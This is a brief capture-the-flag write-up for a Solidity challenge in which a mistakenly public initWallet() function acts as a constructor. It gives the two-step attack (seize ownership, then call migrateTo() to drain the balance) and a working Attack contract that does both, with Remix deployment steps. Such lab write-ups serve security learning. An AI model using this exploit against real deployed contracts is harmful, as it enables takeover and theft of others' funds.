## WriteUp

The challenge1.sol smart contract is vulnerable. The constructor was not set well. Instead of constructor, it is a callable function.

There is two step :

# Step 1 : 

Call the function initWallet() to gain the owner rights.

# Step 2 : 

Call the function migrateTo("youraddress") to steal his money.




# AttackContract

With the blockchain running, it can be solve with this smart contract 


// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "./chall1.sol";

contract Attack {
    Challenge1 public victim;
    mapping(address => uint256) balances;


    constructor(address _victimAddress)payable {
        victim = Challenge1(_victimAddress);
    }

    function beginAttack() external payable {
        victim.initWallet();
        victim.migrateTo(0x723c3E5417cae4425Ae95c2E94E80163Ae3B8101);
    }
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }


}



First deploy this contract in remix with the address of the challenge that the website give you.

Then call beginAttack().

The address in migrateTo() is yours.
